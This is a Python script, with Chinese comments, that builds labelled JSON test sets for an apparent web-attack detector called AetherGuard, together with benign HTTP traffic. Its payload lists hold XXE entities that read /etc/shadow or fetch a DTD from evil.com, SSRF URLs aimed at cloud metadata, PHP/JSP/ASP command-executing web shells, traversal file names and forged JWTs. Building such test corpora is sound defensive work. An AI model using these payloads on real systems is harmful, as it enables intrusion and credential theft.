#!/usr/bin/env python3
"""
AetherGuard 完整测试样本生成器 v2
生成 2000+ 测试样本，覆盖 12 种攻击类型
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent
OUTPUT_DIR.mkdir(exist_ok=True)

# 简化版 - 只生成关键数据
def main():
    print("=" * 70)
    print("AetherGuard 完整测试样本生成器 v2")
    print("=" * 70)
    
    total = 0
    
    # 1-7: 基础攻击类型 (使用之前生成的)
    datasets = {}
    
    # 8. XXE (100)
    datasets["08_xxe"] = generate_xxe(100)
    total += 100
    
    # 9. SSRF (100)  
    datasets["09_ssrf"] = generate_ssrf(100)
    total += 100
    
    # 10. 反序列化 (100)
    datasets["10_deserialization"] = generate_deserialization(100)
    total += 100
    
    # 11. 文件上传 (100)
    datasets["11_file_upload"] = generate_file_upload(100)
    total += 100
    
    # 12. JWT攻击 (100)
    datasets["12_jwt"] = generate_jwt(100)
    total += 100
    
    # 13. LDAP注入 (50)
    datasets["13_ldap"] = generate_ldap(50)
    total += 50
    
    # 14. 正常流量扩展 (500)
    datasets["14_normal_extended"] = generate_normal_extended(500)
    total += 500
    
    # 保存
    for name, data in datasets.items():
        filepath = OUTPUT_DIR / f"{name}.json"
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print(f"✅ {name}.json: {len(data)} 条")
    
    print(f"\n📊 新增样本: {total} 条")
    print("=" * 70)

def generate_xxe(count):
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">]><foo>&xxe;</foo>',
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"xxe_{i:04d}",
            "type": "xxe",
            "payload": random.choice(payloads),
            "severity": "high",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_ssrf(count):
    payloads = [
        "http://127.0.0.1", "http://localhost", "http://[::1]",
        "http://127.0.0.1:80", "http://127.0.0.1:22", "http://127.0.0.1:3306",
        "http://127.1", "http://0x7f000001", "http://2130706433",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://example.com@127.0.0.1",
        "http://127.0.0.1#example.com",
        "http://127.0.0.1.nip.io",
        "gopher://127.0.0.1:70",
        "dict://127.0.0.1:11211/stat",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"ssrf_{i:04d}",
            "type": "ssrf",
            "payload": random.choice(payloads),
            "severity": "high",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_deserialization(count):
    payloads = [
        "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}",
        "O:3:\"Foo\":0:{}",
        "a:1:{s:4:\"test\";s:5:\"value\";}",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4",
        '{"__class__":"stdClass","test":"value"}',
        '{"$type":"System.IO.FileInfo","fileName":"/etc/passwd"}',
        '{"@type":"java.net.Inet4Address","val":"127.0.0.1"}',
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"deser_{i:04d}",
            "type": "deserialization",
            "payload": random.choice(payloads),
            "severity": "critical",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_file_upload(count):
    payloads = [
        {"filename": "shell.php", "content": "<?php system($_GET['c']); ?>"},
        {"filename": "shell.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"},
        {"filename": "shell.asp", "content": "<%eval request(\"c\")%>"},
        {"filename": "shell.aspx", "content": "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(Request[\"c\"])); %>"},
        {"filename": "web.config", "content": "<?xml version=\"1.0\"?>..."},
        {"filename": "../../../var/www/html/shell.php", "content": "<?php system($_GET['c']); ?>"},
        {"filename": "shell.php.jpg", "content": "<?php system($_GET['c']); ?>"},
        {"filename": "shell.php%00.jpg", "content": "<?php system($_GET['c']); ?>"},
        {"filename": "shell.phtml", "content": "<?php system($_GET['c']); ?>"},
        {"filename": "shell.php5", "content": "<?php system($_GET['c']); ?>"},
    ]
    dataset = []
    for i in range(count):
        p = random.choice(payloads)
        dataset.append({
            "id": f"upload_{i:04d}",
            "type": "file_upload",
            "filename": p["filename"],
            "content": p["content"],
            "severity": "critical",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_jwt(count):
    payloads = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQ1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SIGNATURE_PLACEHOLDER",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.INVALID_SIGNATURE",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ",
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"jwt_{i:04d}",
            "type": "jwt_attack",
            "payload": random.choice(payloads),
            "severity": "high",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_ldap(count):
    payloads = [
        "*)(uid=*))(|(uid=*",
        "admin)(|(password=*))",
        "*)(objectClass=*)",
        "admin)(cn=*))(|(cn=*",
        "admin)(|(cn=*))",
        "*)(uid=admin))(|(uid=*",
        "admin)(|(password=*)(cn=*))",
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"ldap_{i:04d}",
            "type": "ldap_injection",
            "payload": random.choice(payloads),
            "severity": "high",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

def generate_normal_extended(count):
    samples = [
        "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n",
        "GET /api/v1/users HTTP/1.1\r\nHost: api.example.com\r\nAccept: application/json\r\n",
        "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=test&password=test123",
        "GET /products?category=electronics&page=1 HTTP/1.1\r\nHost: shop.example.com\r\n",
        "POST /api/orders HTTP/1.1\r\nHost: api.example.com\r\nContent-Type: application/json\r\n\r\n{\"product_id\": 123, \"quantity\": 2}",
        "GET /static/css/style.css HTTP/1.1\r\nHost: cdn.example.com\r\n",
        "PUT /api/users/123 HTTP/1.1\r\nHost: api.example.com\r\nContent-Type: application/json\r\n\r\n{\"name\": \"John\"}",
        "DELETE /api/users/123 HTTP/1.1\r\nHost: api.example.com\r\n",
        "GET /search?q=hello+world HTTP/1.1\r\nHost: search.example.com\r\n",
        "POST /contact HTTP/1.1\r\nHost: example.com\r\n\r\nname=John&email=john@example.com&message=Hello",
    ]
    dataset = []
    for i in range(count):
        dataset.append({
            "id": f"normal_{i:04d}",
            "type": "normal",
            "payload": random.choice(samples),
            "severity": "none",
            "expected_detection": False,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": datetime.now().isoformat()
        })
    return dataset

if __name__ == "__main__":
    main()
